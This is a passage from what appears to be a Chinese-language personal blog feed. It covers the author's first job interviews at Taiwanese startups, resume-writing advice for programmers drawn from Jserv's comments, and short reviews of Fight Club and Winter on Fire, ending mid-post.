&lt;li&gt;一開始就問問我之前在系計中管系上 server 的相關經驗，但對他們公司來說應該不是個很有說服力的經驗，畢竟系上 server 的規模實在太小，而且管 server 的模式是一對一，實在跟真正外面公司在玩的一個人管多個 server 是不一樣的世界。  &lt;/li&gt;
&lt;li&gt;被問到一些問題紀錄一下  &lt;ol&gt;
&lt;li&gt;「如果今天要你一個人管 200 台 server 的話，你會怎麼管？」  &lt;/li&gt;
&lt;li&gt;「如果今天要做到根據流量即時增減 server ，而且無法知道新增加的 server 的 IP 的話，你會如何做到自動化佈署？」  &lt;/li&gt;
&lt;li&gt;「除了用預先設定好的 image 以外，有沒有其他更好的作法？」（因為我上一題回答直接佈署預先設定好的 image，直接跟 central node 溝通就好。）  &lt;/li&gt;
&lt;li&gt;「你對維運比較有興趣？還是開發新功能比較有興趣？」（主要是因為我在面試過程中回答的比較偏向 R&amp;amp;D 而不是 OP，但老實說我的確是對 R&amp;amp;D 要做的事比較有興趣。）  &lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;結果  &lt;ul&gt;
&lt;li&gt;被出了個後試，就是上面的第 3 題，但自己回去考慮了一陣子後覺得之後不太想做純維運的工作，就回信感謝面試官花時間面試這樣。  &lt;/li&gt;
&lt;li&gt;這間是我面試的公司裏面，我覺得面試的最認真的一間公司，3 個 Engineer 不說，其中一位還是該 Team 的主管，而且問的問題我覺得都蠻有深度的，有些我真的不太熟，答不上來。他們很謹慎的選擇應徵者的能力，還有必須確認應徵者之後真的是想跟他們一起衝的，如果對自己的能力有信心而且對這間公司在做的事情有興趣的話，可以去應徵看看。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;CHOCOLABS - 歐酷網路&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;應徵職位：Cloud Engineer in Operation （透過 Referral）  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/M157q/resume/issues/23"&gt;https://github.com/M157q/resume/issues/23&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;面試時間： 2016/01/13  &lt;/li&gt;
&lt;li&gt;面試地點： 台北市民權東路三段 142 號 17 樓  &lt;ul&gt;
&lt;li&gt;新辦公室，我面試的時候才剛搬一個禮拜，裝潢都還沒好，印象最深刻的是有一整片的透明玻璃就面對著松山機場，有一排座位和桌子，可以讓你看著飛機起降 coding。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;面試官： Darren, Henry, Jerry （三位分開面試）  &lt;/li&gt;
&lt;li&gt;面試過程  &lt;ul&gt;
&lt;li&gt;專案總監 Darren 先跟我聊他們公司目前的狀況、裏面 App 的產品分類以及未來這年的目標。聊完後覺得是我面試中遇到對公司未來的藍圖最有想法的一位，對於公司裏面目前現有 App 的狀況以及之後的發展走向都蠻具體的。  &lt;/li&gt;
&lt;li&gt;首席架構師 Henry 則是問了一些技術相關的問題，大部份都蠻簡單的，例如：「git 有用過 checkout 和開過新的 branch 嗎？」、「你修過軟體工程，那有聽過瀑布開發或其他的開發方式嗎？」不過我在一些比較深入的研究所相關的課程比較吃虧，像被問到有沒有修過「分散式計算」、「機器學習」、「雲端系統」，我就只能摸摸鼻子說沒修過，但有在關注相關的技術。  &lt;/li&gt;
&lt;li&gt;CTO &amp;amp; co-founder Jerry 則是和我聊我如果進去他們公司的話會想要負責哪些部份、薪水、還有問我有沒有其他問題這樣。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;結果  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Offer got 最高給 50 K，但婉拒了。  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;當下是跟對方說回去考慮考慮，然後會再回信告知，後來就寄信婉拒了。雖然上班環境真的蠻棒的，而且因為是 App 團隊的關係，性別比例看起來頗均衡的，但主要是因為是寫 Node.js 我沒有特別喜歡也沒有到很熟，還有因為他們做了很多 App 的關係，讓我覺得之後可能會常常做一些重複性的事情（比如這支 App 寫完要寫下支 App 這樣，後端來講可能差別都不太大，比較有差的大概是前端設計的部份吧？），再加上 pay 略低於我自己的期望，所以就婉拒了這樣。  &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;心得&lt;/h2&gt;
&lt;p&gt;人生第一次的面試，&lt;br /&gt;
感覺跟想像中的不太一樣，&lt;br /&gt;
原本腦海中想像的都是大公司那樣的面試，&lt;br /&gt;
必須要準備很多演算法跟資料結構相關的內容，&lt;br /&gt;
然後要過好幾關。  &lt;/p&gt;
&lt;p&gt;我想大概是因為我選的大多是新創的小公司關係吧，&lt;br /&gt;
主要是因為我自己也比較喜歡新創公司的氣氛，&lt;br /&gt;
聽過許多同學朋友在大公司實習或工作的狀況，&lt;br /&gt;
覺得實在沒有很喜歡。&lt;br /&gt;
雖然福利跟薪資就真的都比新創公司來的好，&lt;br /&gt;
自己對大公司的面試雖然沒有到很有把握，&lt;br /&gt;
但也不覺得自己的能力會輸同屆的，&lt;br /&gt;
但就真的不是很喜歡被當小螺絲和被限制要做什麼事情的感覺，&lt;br /&gt;
所以就在選面試公司的時候就挑工作內容自己有興趣的，&lt;br /&gt;
和覺得可以學到東西比較有發展性的新創公司。&lt;br /&gt;
主要是也比較喜歡新創公司自由的風氣啦，&lt;br /&gt;
無論是上下班時間或是請假制度等等。  &lt;/p&gt;
&lt;p&gt;覺得面試比自己想像中的順利很多，&lt;br /&gt;
也意識到自己有許多東西真的學的不夠扎實，&lt;br /&gt;
我想就是透過之後工作的時候邊做邊學吧，&lt;br /&gt;
沒學好的也要花時間來為自己補習一下。  &lt;/p&gt;
&lt;p&gt;不過面試的結果自己覺得倒沒有很好，&lt;br /&gt;
感覺台灣用 Python 的公司真的沒到很多，&lt;br /&gt;
網路業大概就還是 Node.js, PHP 和 Java 居多。&lt;br /&gt;
然後也沒辦法像 Soft_job 版的神人面試二十幾家公司，&lt;br /&gt;
覺得這樣實在是太累了，&lt;br /&gt;
正常來說應該還是挑大概三到五間自己真的有興趣的公司去面試，&lt;br /&gt;
我覺得比較適合，不會太累，找工作的時間也不會拖到太長。  &lt;/p&gt;
&lt;p&gt;是說有個獵人頭幫忙安排面試真的覺得比較輕鬆一點，&lt;br /&gt;
幾乎都不用自己去接洽 HR，&lt;br /&gt;
只要給自己有空的時間請獵人頭幫忙安排就行。&lt;br /&gt;
不過缺點大概就是會被推薦一些自己不是那麼想要的職缺，&lt;br /&gt;
但可以透過跟獵人頭的溝通解決這個問題就是，&lt;br /&gt;
也有可能意外發現自己沒注意到的好職缺也不一定，&lt;br /&gt;
雖然機率可能不高啦？&lt;br /&gt;
我是想說自己身為一個新鮮人，&lt;br /&gt;
多去累積一些不同公司的面試經驗也不錯，&lt;br /&gt;
所以聽聽職缺和在做的事後，&lt;br /&gt;
雖然自己可能覺得不是很 match 該公司的要求也會想去面試看看。&lt;br /&gt;
可能之後找下一份工作的時候就會比較 focus 在特定的範圍，&lt;br /&gt;
然後不透過獵人頭找工作也不一定。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;後記 (2016/05/16)&lt;/h2&gt;
&lt;p&gt;距離這篇文章發佈約莫過了 3 個月，&lt;br /&gt;
比較讓我訝異的是這篇跟我其他的文章比起來好像被頗多人看到的，&lt;br /&gt;
(Jane 跟我說她的同事丟了這篇文章給她看的當下我有點嚇到）&lt;br /&gt;
Google Analytics 看了一下，&lt;br /&gt;
總共 1,452 (565 unique) page views，&lt;br /&gt;
其中有 1,052 (395 unique) 是透過搜尋找到的，&lt;br /&gt;
當初寫這篇文章的時候比較著重在紀錄資訊給以後的自己看，&lt;br /&gt;
其實從大學以來寫 blog 一直都是給自己備忘用的，&lt;br /&gt;
並沒有想要專門寫給別人看，&lt;br /&gt;
但如果剛好能幫助到人也不錯。  &lt;/p&gt;
&lt;p&gt;原本以為這種短短幾個月就有點流量的應該是有人在社群網站 share 之類的，&lt;br /&gt;
但這篇我記得我並沒有 share 到我的 Facebook。&lt;br /&gt;
（我很少 share 自己的文章到自己的 Facebook，&lt;br /&gt;
雖然之前 share 過的幾次的確會讓我這平常沒啥人看的 blog 流量上升不少，&lt;br /&gt;
但其實上面也說了，這不太符合我寫 blog 的本意。）&lt;br /&gt;
沒想到竟然是透過搜尋而找到的佔了 2/3，&lt;br /&gt;
試著自己拿關鍵字去 Google 一下，&lt;br /&gt;
發現根本找不到啊 XDDD&lt;br /&gt;
到底是怎麼搜尋到這篇的？&lt;br /&gt;
是搜到出現有在文章裡面的公司名稱然後加上"面試"的關鍵字嗎？  &lt;/p&gt;
&lt;p&gt;總之，&lt;br /&gt;
能夠寫這麼長的一篇文得謝謝很多人：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;謝謝爸媽讓我在家裡當了快半年的啃老族。  &lt;/li&gt;
&lt;li&gt;謝謝 Jserv 花了一個下午跟我講了很多關於履歷撰寫、面試經驗以及出社會工作應該要具備的心態。  &lt;/li&gt;
&lt;li&gt;謝謝愚笨讓我下去台南找 Jserv 的時候有免費的地方可住。  &lt;/li&gt;
&lt;li&gt;謝謝 Sudo_ 的 Jane，幫了我很多忙，提供給我不少資訊，每個面試前也會打電話提醒我時間，面試後也會打電話來問我狀況如何。  &lt;/li&gt;
&lt;li&gt;謝謝 Tagtoo 的 Teddy 讓我在第一次面試就拿到 Offer 後，還願意等我等了將近一個月，讓我有機會可以多去不同間公司面試。  &lt;/li&gt;
&lt;li&gt;謝謝 Apua 讓我在剛上來台北市工作沒地方住的時候讓我借住了整整一個月，一分錢都沒跟我收。  &lt;/li&gt;
&lt;li&gt;謝謝大慶的 VMFive referral，花時間看了我的履歷，也讓我問了不少問題。  &lt;/li&gt;
&lt;li&gt;謝謝所有願意花時間面試我的人，每一次的面試對我來說都是寶貴的經驗。  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;後記 (2016/11/26)&lt;/h2&gt;
&lt;p&gt;Sudo_ 於 2016/11/20 吹熄燈號了。&lt;br /&gt;
沒想到才過不到一年，&lt;br /&gt;
變化竟然這麼大。&lt;br /&gt;
不禁也想問一下自己，&lt;br /&gt;
工作十個月了，&lt;br /&gt;
自己的能力增長幅度夠大嗎？  &lt;/p&gt;
&lt;p&gt;總之，&lt;br /&gt;
看來下次找工作得自己找了，&lt;br /&gt;
畢竟 LinkedIn 上遇到的 Head Hunter 感覺都普普，&lt;br /&gt;
有種亂槍打鳥的感覺。&lt;br /&gt;
然後我也不會想用傳統人力銀行的服務。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;後記 (2017/09/22)&lt;/h2&gt;
&lt;p&gt;因為以下幾個原因，&lt;br /&gt;
所以我停止維護 &lt;a href="https://github.com/M157q/linkedin2md"&gt;linkedin2md&lt;/a&gt; 這個小程式了。  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;LinkedIn 開始阻擋未登入的連線拿到公開的個人頁面資料  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://news.ycombinator.com/item?id=14891301"&gt;LinkedIn 聲稱未經許可蒐集該網站上個人資料視為違法行為&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;LinkedIn 的網頁格式已經改版許多  &lt;/li&gt;
&lt;li&gt;上面有提到這個小程式其實效用不是那麼大，因為產生出來的 CV 其實也不能直接拿來當作履歷投遞，所以我覺得不值得花時間繼續維護它。  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;就拿這個 &lt;a href="https://github.com/M157q/linkedin2md/commit/297f1c3ca0c2d40add957fd735b8bf825268a38b"&gt;commit&lt;/a&gt; 幫這個小程式畫下句點吧。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;後記 (2018/01/18)&lt;/h2&gt;
&lt;p&gt;在 2017 年 11 月底算是正式從自己的第一份工作離職了，&lt;br /&gt;
離職的心得紀錄在這篇：&lt;a href="/posts/2017/12/26/i-left-my-first-full-time-job/"&gt;我的新鮮人離職紀錄&lt;/a&gt;，&lt;br /&gt;
標題算是與這篇文章的標題呼應吧。  &lt;/p&gt;
&lt;p&gt;其實後來才知道前公司很多比我晚到職的同事都看過這篇文章，&lt;br /&gt;
其實每個人跟我講的當下我都滿開心的，&lt;br /&gt;
雖然我可能沒有喜形於色就是。&lt;br /&gt;
甚至有前同事跟我說「看到這篇文章，覺得這個人好像滿有趣的，如果可以共事應該不錯。」&lt;br /&gt;
總之，如果是要一起當同事的話，&lt;br /&gt;
請敬請期待下一篇面試文章囉，&lt;br /&gt;
最近開始在找工作了。&lt;br /&gt;
之後這篇應該就不會有新的後記了吧 XD  &lt;/p&gt;</summary><category term="interview"></category><category term="resume"></category><category term="job"></category></entry><entry><title>電影：Fight Club</title><link href="https://blog.m157q.tw/posts/2016/01/23/fight-club/" rel="alternate"></link><published>2016-01-23T18:17:00+08:00</published><updated>2016-01-23T18:17:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-01-23:posts/2016/01/23/fight-club/</id><summary type="html">&lt;p&gt;&lt;a href="http://www.imdb.com/title/tt0137523/"&gt;Fight Club (1999) - IMDb&lt;/a&gt;&lt;br /&gt;
片名中文翻譯：《鬥陣俱樂部》  &lt;/p&gt;
&lt;p&gt;會知道這部電影是因為它在很多我看過的電影中都被提及，看完後真的覺得很棒。&lt;br /&gt;
一直都很喜歡這類需要動腦看的電影，因為我很喜歡專注看電影的細節然後猜劇情。&lt;br /&gt;
雖然這部的劇情有被我猜中，但後來看了一些影評才發現我有很多細節沒有注意到。&lt;br /&gt;
尤其是對於資本主義的嘲諷（肥皂的部份），&lt;br /&gt;
以及導演試圖告訴觀眾主角其實就是每個在看電影的你，&lt;br /&gt;
因為電影裡頭從頭到尾都沒提到主角的名字。&lt;br /&gt;
還有首尾呼應以及電影本身就和電影本身提到的哲學相互呼應（關於剪接的部份）。  &lt;/p&gt;
&lt;p&gt;然後看英文字幕的過程也查了一堆不會的單字...&lt;br /&gt;
這部電影好像造就了一個新詞 "Lead Salad"&lt;br /&gt;
例句：I am going to offer you a lead salad.&lt;br /&gt;
當某人說要給你來份 Lead Salad 的意思就是他要拿槍塞進你的嘴裏。  &lt;/p&gt;
&lt;p&gt;還學到了一個新詞 "Pay dirt!"&lt;br /&gt;
意思有點類似「撿到寶了！」  &lt;/p&gt;</summary><category term="Movie"></category><category term="Fight Club"></category></entry><entry><title>程式設計師的履歷撰寫要點</title><link href="https://blog.m157q.tw/posts/2016/01/22/how-to-write-a-resume-for-programming-jobs/" rel="alternate"></link><published>2017-01-03T23:12:00+08:00</published><updated>2017-01-03T23:12:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-01-22:posts/2016/01/22/how-to-write-a-resume-for-programming-jobs/</id><summary type="html">&lt;p&gt;我覺得這篇可能比較適用於像我這種人：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;對於資工領域的確有熱情  &lt;/li&gt;
&lt;li&gt;會自己去研究和實作有興趣的東西  &lt;/li&gt;
&lt;li&gt;會主動參加 Conferences, meetup, community 聚會  &lt;/li&gt;
&lt;li&gt;覺得每天沒有看到程式碼或是資工相關領域資訊就會覺得不太舒服  &lt;/li&gt;
&lt;li&gt;成績不是書卷獎（對有興趣的主科就會拿很高分，但沒興趣的主科就很低分）  &lt;ul&gt;
&lt;li&gt;對科目的興趣跟成績成強烈的正比  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;競賽表現沒特別突出  &lt;/li&gt;
&lt;li&gt;非常需要在履歷上強調自己除了成績以外的獨特性  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;至於不要有錯字、文法要正確、不欺騙等等最基本的原則就不多提了。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;履歷很可能會被印成紙本&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Jserv：「&lt;br /&gt;
有公司會把履歷印成紙本給面試官，&lt;br /&gt;
而不是直接用電子檔。&lt;br /&gt;
不要問我為什麼，&lt;br /&gt;
就是有。&lt;br /&gt;
」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;為了因應這類情況，必須注意下列幾點：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;超連結拿掉底線，避免底線影響閱讀，導致無法辨認連結。  &lt;/li&gt;
&lt;li&gt;超連結的字型請選用可以清楚辨別 0/O, 1/l, ... 的字型。  &lt;/li&gt;
&lt;li&gt;超連結的部份還是得用個藍色，讓人家知道那是個超連結。  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;需要有個 Summary&lt;/h2&gt;
&lt;p&gt;簡述自己在資工方面的專業特質，&lt;br /&gt;
讓看履歷的人能夠很快瞭解你跟其他應徵者的差異，&lt;br /&gt;
並能夠很快被說服為什麼你適合這個職缺。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;在說自己的經歷或自己會哪些東西的時候，請舉實際的例子&lt;/h2&gt;
&lt;p&gt;只說自己用過什麼東西是不夠的。&lt;br /&gt;
請重點描述自己究竟做了什麼事。&lt;br /&gt;
例如修改或改善過哪個開源專案中哪個部份的程式碼，&lt;br /&gt;
描述你解決了什麼 bug，能夠附上 accepted PR 的連結的話更好。&lt;br /&gt;
只寫改善效能是不夠的，快了幾秒，使用者上限增加了多少，請給出數字。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;用數字和實例強調自己的特質&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Jserv：「&lt;br /&gt;
能夠為了工作需求並快速學新技能這個就別寫了，&lt;br /&gt;
如果你這年輕人還辦不到這件事的話，&lt;br /&gt;
那乾脆別找工作了。&lt;br /&gt;
」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;你一定有跟別人不同的地方，在履歷上要讓人家看到。&lt;br /&gt;
如果真的沒有到跟所有人都不同，那就把標準放到跟同屆同儕相比，一定有自己的特質。&lt;br /&gt;
如果真的沒有的，那就是悲劇了。  &lt;/p&gt;
&lt;p&gt;切忌在技能與工作內容的描述上只空泛的描述職位做哪些事，例如：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;網頁前端設計  &lt;/li&gt;
&lt;li&gt;撰寫網站後端新功能  &lt;/li&gt;
&lt;li&gt;Linux 伺服器維運  &lt;/li&gt;
&lt;li&gt;演算法及資料結構優化  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;請詳細並取重點的描述工作內容，有數字佐證最好，例如：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;改進網頁前端設計，幫助前公司提升了 157 萬的瀏覽人次。  &lt;/li&gt;
&lt;li&gt;網站後端的新功能讓公司的業務操作更加方便，提升了 381 萬的營收。  &lt;/li&gt;
&lt;li&gt;同時維護 689 台 Linux Server 且上線率達到 99%，上好上滿。  &lt;/li&gt;
&lt;li&gt;對程式某部份的的演算法進行優化，原本採用 XX 演算法，觀察並分析使用情境後，改用 YY 演算法，縮短了 50% 的執行時間。  &lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Jserv：「&lt;br /&gt;
你履歷上只寫管 Linux server，隨便一個鳥哥的學生都可以說自己會管 Linux server 啊，&lt;br /&gt;
我從履歷上看不出來你跟那些學生差在哪裡。問題在於你做的多深入，&lt;br /&gt;
你有沒有為了 server 的效能問題去 trace 過 Linux 的 kernel code?&lt;br /&gt;
你有沒有去比較過不同 File System 的差異？甚至改過 File System 的程式碼？&lt;br /&gt;
你管過的 server 規模多大？自己在宿舍架一台桌機也可以叫管 Server，同時管 100 台 server 也叫管 server，但差別很大啊。&lt;br /&gt;
有的話就把他寫上去，而不是只寫管 Server，寫重點才能吸引看你履歷的人，而不是一些很空泛粗淺的敘述。&lt;br /&gt;
」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;再從自己的特質去延伸，說明自己的特質可以為這間公司帶來什麼樣的價值。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;有帶過人當過 mentor 而且帶的不錯的經驗可以寫出來，因為你應徵的公司非常有可能需要這樣的人。  &lt;/li&gt;
&lt;li&gt;有和其他非技術人員的 Team 良好的溝通經驗也可以寫，尤其如果你對新創公司比較有興趣的話，新創公司非常需要這樣的人。  &lt;ul&gt;
&lt;li&gt;大公司其實也會需要，因為在寫程式的各個過程往往會需要很頻繁的溝通彼此的想法。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;有在有點知名度的 conferenece 給過技術型演講的經驗且聽眾反應不錯的話可以寫出來，代表你有辦法好好的表達技術如何實作。  &lt;/li&gt;
&lt;li&gt;有對應徵的職位需要用到或是相關的專案有貢獻的要寫出來，代表你具有修改程式碼的實力，而不是只是嘴炮而已。  &lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Jserv：「&lt;br /&gt;
&lt;a href="https://twitter.com/jserv/status/681429579286761472"&gt;準備個人簡歷不難。對於交大資工的畢業生，只要指出「我不只是個肥宅」，對於成大資訊系的畢業生，只要指出「我為何遠比同學們強」即可。&lt;/a&gt;&lt;br /&gt;
」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;超連結一律放在 references，就像論文的寫法那樣。&lt;/h2&gt;
&lt;p&gt;避免看你的履歷的人看到連結點進去看後，可能就回不來了。  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Jserv：「&lt;br /&gt;
誰規定履歷只能一頁的？&lt;br /&gt;
你可以多個一頁 references 放連結啊，&lt;br /&gt;
如果我看完一頁履歷還對你有興趣的話，&lt;br /&gt;
我就會去點 references 裡頭的東西來看看。&lt;br /&gt;
」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;版面大的地方會吸引人的目光&lt;/h2&gt;
&lt;p&gt;如果履歷中有某個 section 的版面佔的比較多的話，&lt;br /&gt;
請確保那部份的內容夠精彩，&lt;br /&gt;
因為在視覺閱讀上來說，&lt;br /&gt;
版面篇幅最大的地方容易讓人最先注意到。&lt;br /&gt;
如果看你履歷的人第一眼看到那部份，&lt;br /&gt;
卻發現用了很多篇幅在講很空泛的描述，&lt;br /&gt;
大概就不會想看下去了，&lt;br /&gt;
所以用字請儘量精簡，&lt;br /&gt;
並確保篇幅佔比較多的內容是有料且吸引人的。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;學生社團的社長不叫 CEO&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Jserv：「&lt;br /&gt;
這年頭，我都會被學生拿出來的名片嚇到。&lt;br /&gt;
社長就叫 CEO、副社長就叫 COO、課程長就叫 CTO、總務就叫 CFO。&lt;br /&gt;
學生社團的 title 不是這樣玩的啦。&lt;br /&gt;
」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;如果你在經歷上寫擔任過社團幹部，稱謂請不要亂用。&lt;br /&gt;
最好還要加上一句話敘述自己在社團做的事跟要應徵的工作有關聯性。&lt;br /&gt;
如果你今天是要應徵軟體工程師，結果你寫自己當過熱舞社社長，跳舞跳的很棒，那不是很怪嗎？  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;面試官尖銳的問題是危機也是轉機&lt;/h2&gt;
&lt;p&gt;面試官可能會針對弱點進行尖銳的詢問，&lt;br /&gt;
要有自己的一套說詞，&lt;br /&gt;
但切忌不可撒謊。  &lt;/p&gt;
&lt;p&gt;履歷跟面試就是在推銷自己，&lt;br /&gt;
人總是會有弱點，&lt;br /&gt;
你可以有自己的一套說詞，&lt;br /&gt;
來巧妙的解釋自己的弱點。  &lt;/p&gt;
&lt;p&gt;比如說：&lt;br /&gt;
面試官問：「為什麼你的這科成績這麼差？」&lt;br /&gt;
回答可能是當時在忙著寫哪些程式，&lt;br /&gt;
或是對同時在學習的其他科目比較有興趣，&lt;br /&gt;
進而壓縮到分配給該科的時間，&lt;br /&gt;
然後舉出花了時間的那方面做了什麼突出的事，&lt;br /&gt;
如果跟應徵的職位有關最好，&lt;br /&gt;
（一般來說應該會跟應徵的職位有關才是，畢竟都已經是根據自己的興趣找工作了，如果不是的話，這篇可能不適用。）&lt;br /&gt;
一方面是轉移注意力，一方面是強調自己所學跟職位 Match，而且可能是學校不教的東西。  &lt;/p&gt;
&lt;p&gt;又可能問：「為什麼你畢業後沒有馬上找工作？」&lt;br /&gt;
可能就可以提在畢業後到找工作這段期間做了什麼跟找工作有關的準備，&lt;br /&gt;
例如：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;可能複習了資料結構跟演算法，如果面試官現場考了又能夠回答的很快，就很有說服力。  &lt;/li&gt;
&lt;li&gt;可能貢獻了某個知名的 Open Source project，可以跟面試官分享詳細的心得，如果剛好跟應徵的職位 match 就很好。  &lt;/li&gt;
&lt;li&gt;可能自己寫了什麼 side project，而且的確解決了什麼迫切的問題，也可以在這時候分享。  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;當然如果是把時間花在跟寫程式沾不上邊的，就無法了，&lt;br /&gt;
直接坦承自己沒認真比較好，總之切忌說謊。  &lt;/p&gt;
&lt;p&gt;尖銳的問題是雙面刃，回答的好加上展現實力的話會大大加分和加深面試官對你的印象。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;真正強的人只要一句話&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Jserv：「&lt;br /&gt;
真正強的人只要在面試的時候跟面試官講他有自信為這間公司帶來多少營收，&lt;br /&gt;
面試官問的問題能夠解答，甚至提出進一步的問題反問面試官，&lt;br /&gt;
問到連面試官都答不出來的時候，對面試官說出一句：&lt;br /&gt;
『我可以解決這問題，可以透過 ... 達成，而這就是為什麼貴公司需要錄用我的原因。』&lt;br /&gt;
」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;後記&lt;/h2&gt;
&lt;p&gt;大概在找完 Jserv 的一個禮拜後，&lt;br /&gt;
在網路上看到了 Skymizer 的這篇文章 &lt;a href="https://blog.skymizer.com/resume2015/"&gt;應徵大作戰，投出你的面試門票！（履歷篇）&lt;/a&gt;&lt;br /&gt;
應該是截至目前為止我看到最接近 Jserv 給我的意見的文章，&lt;br /&gt;
紀錄一下，非常值得閱讀。  &lt;/p&gt;</summary><category term="Resume"></category></entry><entry><title>電影：Winter on Fire: Ukraine's Fight for Freedom</title><link href="https://blog.m157q.tw/posts/2016/01/10/winter-on-fire/" rel="alternate"></link><published>2016-01-24T23:47:00+08:00</published><updated>2016-01-24T23:47:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-01-10:posts/2016/01/10/winter-on-fire/</id><summary type="html">&lt;p&gt;&lt;a href="http://www.imdb.com/title/tt4908644/"&gt;Winter on Fire: Ukraine's Fight for Freedom&lt;/a&gt;&lt;br /&gt;
片名中文翻譯：《焚燒之冬》、《凜冬烈火》  &lt;/p&gt;
&lt;p&gt;&lt;img alt="Winter on Fire" src="/files/winter-on-fire/winter-on-fire.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;這部電影是在描述 2013 年底，&lt;br /&gt;
烏克蘭民眾為了向矮化烏克蘭主權的親俄總統亞努科維奇，&lt;br /&gt;
以及制定並舉手投票表決通過種種離譜法律的民意代表，&lt;br /&gt;
表達強烈的不滿而引發的一場死傷慘重的抗議運動。&lt;br /&gt;
期間烏克蘭總統甚至動用了軍隊以及警察去對付手無寸鐵的抗議民眾，&lt;br /&gt;
使得烏克蘭的民眾不得不武裝自己起身反抗同是烏克蘭同胞的警察與軍人。&lt;br /&gt;
整個抗爭活動持續了九十幾天，完全在冰天雪地的冬季度過，非常辛苦。&lt;br /&gt;
抗爭期間，警察從原本的盾牌警棍到橡膠子彈再到真槍實彈。&lt;br /&gt;
有數百多位抗議民眾死傷，軍警甚至直接攻擊救護站。&lt;br /&gt;
最後抗爭活動在亞努科維奇下台潛逃到俄國並重選總統下落幕。  &lt;/p&gt;
&lt;p&gt;看了真的會想到 2014 年 318 太陽花學運的畫面，&lt;br /&gt;
當然烏克蘭的狀況比太陽花學運的情況嚴重很多，&lt;br /&gt;
時間持續了九十多天，也死傷很多人。&lt;br /&gt;
不意外的，台灣國內的新聞媒體對烏克蘭的情況一樣沒什麼太多的報導。&lt;br /&gt;
再次感到政府和民代是絕對需要人民的監督的，&lt;br /&gt;
公民絕對不可以忘記在自由民主的體制下，人民才是主人，&lt;br /&gt;
當政府和民代做了違反民意的事，絕對要讓他們知道自己錯做了，&lt;br /&gt;
國家的未來應該是全體公民共同決定，&lt;br /&gt;
而不是少數人把持，甚至黑箱決定一些很離譜的政策。  &lt;/p&gt;
&lt;p&gt;相似的地方是烏克蘭的民意非常兩極，&lt;br /&gt;
儘管烏克蘭在 1991 年早已透過投票率 84.18% 且贊成率高達 92.3% 的公投而獨立建國，&lt;br /&gt;
然而對於這場抗爭，當地的民意調查卻顯示，&lt;br /&gt;
有 45~50% 的烏克蘭人支持這次示威，而 42%~50% 的人反對，&lt;br /&gt;
就像統獨的議題在臺灣也是一樣一半一半的狀況。  &lt;/p&gt;
&lt;p&gt;看完真的會讓人深切體會到生命是多麼脆弱，多麼稍縱即逝，&lt;br /&gt;
而民主自由又是多麼的可貴，一旦失去，竟要花費如此大的代價取回。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
